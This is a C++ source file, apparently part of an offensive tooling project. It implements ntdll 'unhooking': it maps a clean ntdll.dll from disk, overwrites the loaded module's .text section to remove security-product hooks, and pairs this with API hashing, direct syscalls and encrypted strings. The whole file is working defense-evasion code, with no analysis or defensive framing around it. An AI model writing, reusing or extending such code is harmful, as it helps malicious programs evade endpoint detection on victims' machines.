//never attempting manual PE parsing again. not even claude could save me from that brainrot. sticking to easy stuff now!
#include <obfuscation/unhook.hpp>
#include <obfuscation/api_hash.hpp>
#include <obfuscation/syscall.hpp>
#include <crypto_utils/skCrypter.hpp>
#include <windows.h>

namespace unhook {

static LPVOID g_clean_ntdll = nullptr;

LPVOID get_clean_ntdll() { return g_clean_ntdll; }

void unhook_ntdll() {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, L"\\ntdll.dll");

    HANDLE file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (file == INVALID_HANDLE_VALUE) return;

    //SEC_IMAGE gives same virtual layout as loader, so RVAs match the loaded copy
    HANDLE mapping = CreateFileMappingW(file, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    CloseHandle(file);
    if (!mapping) return;

    LPVOID fresh = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(mapping);
    if (!fresh) return;

    constexpr DWORD h_ntdll = api_hash::hash(L"ntdll.dll");
    HMODULE ntdll = api_hash::get_module(h_ntdll);
    if (!ntdll) { UnmapViewOfFile(fresh); return; }

    auto dos = (PIMAGE_DOS_HEADER)fresh;
    auto nt  = (PIMAGE_NT_HEADERS)((BYTE*)fresh + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, skCrypt(".text"), 5) != 0) continue;

        PVOID  dst = (BYTE*)ntdll + sec->VirtualAddress;
        PVOID  src = (BYTE*)fresh + sec->VirtualAddress;
        SIZE_T sz  = sec->SizeOfRawData;
        ULONG  old = 0;

        nt_protect(GetCurrentProcess(), &dst, &sz, PAGE_EXECUTE_READWRITE, &old);
        memcpy(dst, src, sz);
        nt_protect(GetCurrentProcess(), &dst, &sz, old, &old);
        break;
    }

    //keep the clean view alive so syscall init can re-resolve from unhooked exports
    g_clean_ntdll = fresh;
}

}
